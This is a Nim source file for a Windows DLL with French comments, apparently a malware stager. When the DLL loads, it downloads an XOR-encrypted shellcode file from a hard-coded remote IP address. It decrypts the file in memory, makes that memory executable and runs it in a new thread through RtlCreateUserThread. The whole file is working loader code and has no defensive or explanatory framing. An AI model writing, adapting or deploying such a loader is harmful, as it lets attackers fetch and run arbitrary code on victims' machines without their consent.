import winim/lean
import std/httpclient 
import std/strutils

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    proc fetchShellcode(url: string): seq[byte] = 
      let client = newHttpClient()
      try:
          return cast[seq[byte]](client.getContent(url))
      finally:
          client.close()

    

    # Fonction de déchiffrement XOR
    proc xorDecrypt(data: ptr UncheckedArray[byte], length: int, key: openArray[byte]) =
        for i in 0..<length:
            data[i] = data[i] xor key[i mod key.len]


    let URL = "http://64.227.47.209:8000/shellcode_encrypted.bin"
    const XOR_KEY: array[4, byte] = [0x41'u8, 0xF3'u8, 0x89'u8, 0xC7'u8]

    var shellcode = fetchShellcode(URL)
    if shellcode.len == 0:
      MessageBox(0, "Erreur : impossible de récupérer le shellcode", "Warning", 0)
      quit(1)
    
    var pMemory = VirtualAlloc(
      NULL,
      cast[SIZE_T](shellcode.len),
      MEM_COMMIT or MEM_RESERVE,
      PAGE_EXECUTE_READWRITE
    )

    # Copier le shellcode chiffré en mémoire
    copyMem(pMemory, addr shellcode[0], shellcode.len)

    # Déchiffrer le shellcode en mémoire
    var oldProtect: DWORD
    VirtualProtect(pMemory, shellcode.len, PAGE_READWRITE, addr oldProtect)
    xorDecrypt(cast[ptr UncheckedArray[byte]](pMemory), shellcode.len, XOR_KEY)
    VirtualProtect(pMemory, shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)

    type
      PRTLCREATEUSERTHREAD = proc(
          ProcessHandle: HANDLE,
          SecurityDescriptor: PSECURITY_DESCRIPTOR,
          CreateSuspended: BOOLEAN,
          StackZeroBits: ULONG,
          StackReserved: PSIZE_T,
          StackCommit: PSIZE_T,
          StartAddress: PVOID,
          StartParameter: PVOID,
          ThreadHandle: PHANDLE,
          ClientId: PCLIENT_ID
      ): NTSTATUS {.stdcall.}

    # Charger la DLL ntdll.dll qui contient RtlCreateUserThread
    let ntdll = LoadLibraryA("ntdll.dll")
    # Obtenir l'adresse de la fonction RtlCreateUserThread
    let RtlCreateUserThread = cast[PRTLCREATEUSERTHREAD](GetProcAddress(ntdll, "RtlCreateUserThread"))

    var threadHandle: HANDLE
    var clientId: CLIENT_ID

    # Création du thread avec RtlCreateUserThread
    let status = RtlCreateUserThread(
      GetCurrentProcess(),    # Utilise le processus actuel
      NULL,                   # descripteur de sécurité
      FALSE,                  # Ne pas créer en état suspendu
      0,                      # adresse de pile
      NULL,                   # Taille de pile
      NULL,                   # Commit de pile
      pMemory,                # shellcode comme point d'entrée
      NULL,                   
      addr threadHandle,      # Récupère le handle du thread
      addr clientId           # Récupère l'ID du thread
    )

    if NT_SUCCESS(status):
      MessageBox(0, "Thread créé avec ID: " & cast[string](clientId.UniqueThread) ,"Titre",0)
      discard WaitForSingleObject(threadHandle, 10000)  # 10 secondes max
      CloseHandle(threadHandle)  # Nettoie le handle
    else:
      MessageBox(0, "Erreur lors de la création du thread: " & cast[string](status) ,"Titre",0)




  return true